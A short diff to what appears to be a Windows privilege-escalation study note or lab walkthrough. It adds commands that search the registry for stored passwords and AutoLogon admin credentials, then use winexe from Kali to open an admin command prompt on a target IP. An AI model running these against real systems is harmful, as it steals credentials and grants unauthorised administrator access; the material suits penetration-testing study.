@@ -11,6 +11,15 @@
 
 ```
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+reg query HKLM /f password /t REG_SZ /s
+
+If you want to save some time, query this specific key to find admin AutoLogon credentials:
+
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
+
+winexe -U 'admin%password' //10.48.167.46 cmd.exe
 ```
 
 👉 Look for:
